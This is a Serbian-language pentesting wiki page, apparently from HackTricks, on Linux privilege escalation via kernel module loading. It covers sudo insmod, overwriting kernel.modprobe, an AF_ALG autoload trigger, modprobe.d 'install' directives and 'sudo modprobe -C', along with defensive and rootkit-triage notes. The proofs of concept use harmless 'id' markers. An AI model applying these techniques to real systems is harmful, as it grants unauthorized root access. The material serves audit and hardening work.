# Zloupotreba kernel modula i modprobe-a

{{#include ../../banners/hacktricks-training.md}}

## Pogrešna podešavanja kernel modula i učitavanja modula

Podrška za kernel module predstavlja oblast visokog uticaja tokom pregleda eskalacije privilegija u Linuxu. Nemojte smatrati da je svaka poruka o nepotpisanom modulu sama po sebi dokaz mogućnosti eksploatacije, već je iskoristite da biste odgovorili na praktična pitanja.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Može li trenutni korisnik da učitava module pomoću `sudo`, capabilities ili putanje do pomoćnog programa sa dozvolom za upis?
- Da li je učitavanje modula i dalje omogućeno?
- Da li je prinudna provera potpisa modula onemogućena?
- Da li su direktorijumi modula, datoteke modula ili putanje konfiguracije `modprobe.d` dostupne za upis?<sup>[[16]](#references)</sup>
- Da li mogu da se čitaju kernel logovi kako bi se potvrdilo šta se dogodilo?

Brza početna provera obuhvata sledeće provere statusa modula, potpisa, logovanja i stabla modula.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Tumačenje:

- `modules_disabled=1` znači da se moduli ne mogu ni učitavati ni uklanjati, a vrednost se ne može vratiti na `0` do ponovnog pokretanja sistema.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` u komandnoj liniji kernela ili `CONFIG_MODULE_SIG_FORCE=y` zahteva ispravno potpisane module; u suprotnom, nepotpisani moduli mogu da se učitaju i označe kernel kao tainted.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` ne postavlja nikakvo ograničenje za `dmesg`; kada je vrednost `1`, za pristup je potreban `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Putanje sa dozvolom za upis u okviru `/lib/modules/$(uname -r)/` su opasne jer `modprobe` pretražuje to stablo i podatke o zavisnostima kada učitava module.<sup>[[8]](#references)</sup>

### Učitavanje modula i čitanje izlaza kernela

Ako imate legitimno ovlašćenje da učitate lokalni modul, `insmod` ubacuje tačno onu `.ko` datoteku koju navedete. Init funkcija modula pokreće se tokom učitavanja, a poruke zapisane pomoću `printk()` odlaze u bafer dnevnika kernela, koji se obično čita pomoću `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalni postupak pregleda koristi `modinfo` za proveru metapodataka, `insmod` i `rmmod` za učitavanje i uklanjanje modula, `lsmod` za potvrdu da je modul učitan, a `dmesg` za pregled dnevnika kernela.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Ako `sudo -l` dozvoljava `insmod`, `modprobe` ili omotač oko njih, smatrajte to kritičnim: `sudo -l` prikazuje privilegije korisnika koji ga je pozvao, a za učitavanje modula kernela potreban je `CAP_SYS_MODULE`. Pogledajte [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) za direktne puteve zasnovane na capability-jima.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` dozvoljen preko sudo

Sudo pravilo koje korisniku dozvoljava da pokrene `insmod` nije isto što i dozvola za pokretanje uobičajenog administrativnog pomoćnog programa. Inicijalizacioni kod modula pokreće se prilikom njegovog učitavanja, pa je praktično pitanje pri proveri da li ovaj korisnik može da izabere ili izmeni modul koji se učitava.<sup>[[3]](#references)</sup>

Sledeći opšti tok provere ponavlja provere pregleda, učitavanja, stanja, evidencije i uklanjanja za dati modul.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Ako korisnik može da obezbedi proizvoljan `.ko`, u ovlašćenoj proceni to treba tretirati kao potpunu kompromitaciju sistema. Bezbedniji operativni pristup je da se učitavanje modula ne delegira preko sudo; ako je to neizbežno, ograničite tačnu putanju, vlasništvo, dozvole, politiku potpisivanja i postupak uklanjanja.<sup>[[3]](#references)[[10]](#references)</sup>

Primer bezopasnog obrasca za izgradnju modula u kontrolisanoj laboratoriji, sa minimalnim izvornim kodom i Makefile datotekom, prikazan je u nastavku; oblik `make -C /lib/modules/$(uname -r)/build M=$PWD` prati dokumentovani kbuild postupak jezgra za spoljne module.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Izgradnju i učitavanje obavljajte samo u ovlašćenom laboratorijskom okruženju; kbuild izgrađuje eksterni modul, a komande za učitavanje/uklanjanje pozivaju interfejse kernel modula.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Provere zloupotrebe `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` određuje userspace pomoćni program koji kernel izvršava za zahteve za automatsko učitavanje modula; ovaj sysctl utiče na automatsko učitavanje, a ne na eksplicitno umetanje modula. Ako napadač može da ga promeni tako da pokazuje na izvršnu datoteku u koju može da upisuje i pokrene zahtev za modul, taj pomoćni program postaje putanja do izvršavanja koda sa privilegijama. Postavljanje na prazan niz onemogućava zahteve za automatsko učitavanje; ako je `CONFIG_STATIC_USERMODEHELPER=y`, neprazna vrednost se zamenjuje putanjom statičkog pomoćnog programa ugrađenog tokom kompilacije.<sup>[[1]](#references)</sup>

Proverite trenutnu putanju pomoćnog programa preko kernel sysctl interfejsa i pregledajte vlasništvo i dozvole cilja.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Proverite da li je moguće uticati na sysctl, delegirana sudo pravila ili capabilities datoteka.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Sledeći obrazac namenjen isključivo laboratoriji menja putanju pomoćnog programa i pokreće dokumentovani zahtev za automatsko učitavanje modula; koristite ga samo na izolovanom sistemu za koji imate ovlašćenje.<sup>[[1]](#references)</sup>

Na aktuelnim Linux kernelima nemojte koristiti nepoznatu izvršnu datoteku kao generički okidač: zastarelo automatsko učitavanje modula za prilagođene binarne formate uklonjeno je u Linuxu 6.14, dok dokumentacija kernela navodi nepoznat tip datotečnog sistema kao putanju koja pokreće zahtev za automatsko učitavanje modula.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Na ojačanim sistemima, ovo bi trebalo da ne uspe kada dozvole sprečavaju neprivilegovano upisivanje u `kernel.modprobe`, kada putanja do pomoćnog programa nije upisiva ili kada je automatsko učitavanje modula onemogućeno.<sup>[[1]](#references)</sup>

### Neprivilegovani AF_ALG okidač za automatsko učitavanje

Okidač za sistem datoteka iznad koristi privilegovani `mount`.<sup>[[1]](#references)</sup> Kada su AF_ALG soketi dostupni, neprivilegovani korisnik umesto toga može da poveže jedan sa namerno nepostojećim tipom.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` zatim traži `algif-<type>` preko `request_module()`, što poziva konfigurisani pomoćni program za module.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Ovo i dalje radi nakon uklanjanja zastarelog automatskog učitavanja za nepoznate binarne formate u Linuxu 6.14.<sup>[[11]](#references)[[17]](#references)</sup> Očekivano je da `bind()` ne uspe jer tip ne postoji; proverite sporedni efekat pomoćnog programa, a ne povratnu vrednost soketa.<sup>[[17]](#references)[[18]](#references)</sup>

U ovlašćenom laboratorijskom okruženju prvo podesite kontrolisani pomoćni program ili pravilo `modprobe.d`, a zatim pokrenite jedan zahtev bez `sudo` ili `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ prihvata AF_ALG torku za povezivanje `(type, name)`.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Ova putanja zahteva upotrebljiv AF_ALG socket i neprazan `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> Na kernelima sa `/proc/sys/crypto/af_alg_restrict`, vrednost `2` onemogućava kreiranje AF_ALG socket-a; vrednost `1` ograničava algoritme, ali ne zaustavlja zahtev za tipom koji nedostaje u `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> LSM može da odbije zahtev za modul pre pozivanja pomoćnog programa.<sup>[[19]](#references)</sup>

### Zapisiva konfiguracija `modprobe.d` i `sudo modprobe -C`

Pre razrešavanja modula, `modprobe` čita `.conf` datoteke iz konfiguracionih direktorijuma kao što su `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` i `/lib/modprobe.d`, redosledom prioriteta. Datoteka istog imena u direktorijumu višeg prioriteta potiskuje datoteku nižeg prioriteta. Još važnije, direktiva `install <module> <command>` pokreće proizvoljnu shell komandu **umesto** učitavanja tog modula. Zato zapisiva konfiguraciona putanja može dovesti do odloženog izvršavanja komandi sa akreditivima kasnijeg privilegovanog `modprobe` pozivaoca; sprovođenje potpisa kernel modula ne potvrđuje autentičnost ove userspace komande.<sup>[[16]](#references)</sup>

Proverite dozvole direktorijuma i datoteka, a zatim pregledajte efektivnu konfiguraciju. `modprobe -n -v` je bezbedan za proveru razrešavanja, jer režim probnog pokretanja ne učitava modul niti izvršava komandu `install`/`remove`. Prednost dajte `modprobe -c` u odnosu na zastareli zapis `--showconfig`, koji aktuelna dokumentacija kmod označava za uklanjanje nakon kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Neograničeno sudo pravilo za `modprobe` može se iskoristiti čak i kada proizvoljne `.ko` datoteke ne mogu da prođu proveru potpisa: `-C` bira konfiguracioni direktorijum pod kontrolom napadača, iz kojeg proces pokrenut pomoću sudo može da izvrši komandu `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Ako je direktorijum `modprobe.d` vidljiv kernelovom pomoćnom procesu upisiv, isti [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) može odmah da pokrene direktivu `install algif-htprobe`, bez čekanja da administrator pozove `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> U ovlašćenom laboratorijskom okruženju, postavite bezopasnu marker komandu u upisivu datoteku `.conf`, proverite razrešavanje pomoću `modprobe -n -v algif-htprobe`, a zatim pokrenite gorenavedeni trigger.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` i sprovođenje potpisa modula blokiraju umetanje modula, ali ne i ovu userspace `install` komandu; prazan `kernel.modprobe` ili blokiran AF_ALG put sprečava ovu putanju za autoload.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Za ublažavanje rizika, nemojte preko sudo-a dozvoliti `modprobe` bez ograničenja argumenata, sve konfiguracione direktorijume držite u vlasništvu root-a i bez prava upisa, i proveravajte neočekivane direktive `install`/`remove`. Kada pouzdani administrativni postupak mora da zaobiđe takve direktive za jedan modul, `modprobe --ignore-install` ignoriše ih za taj modul, ali zavisnosti i dalje mogu imati sopstvene komande.<sup>[[8]](#references)[[16]](#references)</sup>

### Provera direktorijuma `/lib/modules` sa pravom upisa

Direktorijumi modula u koje je moguće upisivati mogu omogućiti zamenu modula, postavljanje zlonamernih modula ili zloupotrebu automatskog učitavanja, u zavisnosti od toga kako se `modprobe` kasnije poziva; `modprobe` pretražuje `/lib/modules/$(uname -r)` i koristi podatke o zavisnostima prilikom razrešavanja modula.<sup>[[8]](#references)</sup>

Proverite datoteke modula i metapodatke o zavisnostima/aliasima u stablu modula izdanja aktivnog kernela, da biste pronašli one в koje је moguće upisivati.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Ako pronađete sadržaj modula u koji je moguće upisivati, proverite kako `modprobe` razrešava zavisnosti i kako `modinfo` prikazuje metapodatke modula.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Odbrambene napomene:

- Obezbedite da je `/lib/modules` u vlasništvu `root:root` i da korisnici nemaju dozvolu za upis.<sup>[[8]](#references)</sup>
- Postavite `kernel.modules_disabled=1` nakon pokretanja sistema, gde je to operativno moguće.<sup>[[1]](#references)</sup>
- Nametnite potpisivanje modula na sistemima kojima su potrebni moduli koji se mogu učitavati.<sup>[[2]](#references)</sup>
- Pratite upise u `/proc/sys/kernel/modprobe`, `/lib/modules` i konfiguracione direktorijume `modprobe.d`, kao i neočekivano pokretanje komandi `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Trijaža rootkita zasnovanih na modulima

Zlonamerni modul može da zakači syscalls, VFS ili prikaze `/proc`, mrežne putanje ili provere akreditiva kako bi sakrio procese i datoteke, preusmerio saobraćaj ili presreo tajne. Može i da se ukloni sa liste modula koju prikazuje `lsmod`. Postojanost može da se obezbedi pomoću aliasa ili pravila za instalaciju u `modprobe.d`, direktorijuma `/etc/modules-load.d`, systemd jedinice, sadržaja initramfs-a ili zamenom legitimne `.ko` datoteke. Uobičajen rezultat komande `lsmod` predstavlja koristan dokaz, ali kompromitacija na nivou kernela može učiniti liste koje obezbeđuje kernel nepouzdanim. Uporedite učitane module, datoteke na disku, konfiguraciju pokretanja sistema, evidenciju učitavanja modula i pouzdanu eksternu telemetriju.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Pregledajte neočekivane nazive modula, putanje, zavisnosti, potpise i vreme učitavanja. Poruke o kernel taint-u i nepotpisanim modulima jesu tragovi, ali ne i dokaz rootkit-a. Ako se sumnja na rootkit, prikupite dokaze iz pouzdane slike ili okruženja za oporavak pre nego što se oslonite na izlaz aktivnog kernela. Stranica [procene ranjivosti kernela](kernel-vulnerability-assessment.md) obrađuje izloženost konfiguracije i dijagnostike, uključujući tracefs i zakačene BPF objekte.



## References

- [1] [Dokumentacija za /proc/sys/kernel/ — Dokumentacija Linux kernela](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mogućnost potpisivanja kernel modula — Dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Osnove upravljačkih programa — Dokumentacija Linux kernela](https://docs.kernel.org/driver-api/basics.html)
- [6] [Beleženje poruka pomoću printk — Dokumentacija Linux kernela](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Izgradnja eksternih modula — Dokumentacija Linux kernela](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Spoji oznaku 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Stranica priručnika za Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Oživljavanje tehnike modprobe_path: zaobilaženje zakrpe za search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG povezivanje i zahtev za modul — izvorni kod Linux kernela](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Pozivanje pomoćnog programa modula — izvorni kod Linux kernela](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Dokumentacija za Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Dokumentacija Linux kernela](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
